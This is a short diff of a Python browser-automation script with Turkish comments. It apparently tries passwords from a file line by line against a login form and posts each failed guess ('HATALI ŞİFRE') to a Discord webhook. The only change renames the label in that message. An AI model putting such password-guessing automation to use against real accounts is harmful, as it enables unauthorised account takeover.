@@ -38,7 +38,7 @@ for satir in dosya:
     time.sleep(5)
     kapat.click()
     time.sleep(5)
-    webhook = DiscordWebhook(url='WEBHOOOK BURAYA', content= "[BASIL]" + " HATALI ŞİFRE: {}".format(satir))
+    webhook = DiscordWebhook(url='WEBHOOOK BURAYA', content= "[" + name + "]" + " HATALI ŞİFRE: {}".format(satir))
     response = webhook.execute()
     username.clear() # Username değişkenini sıfırla.
     password.clear() # Password değişkenini sıfırla.
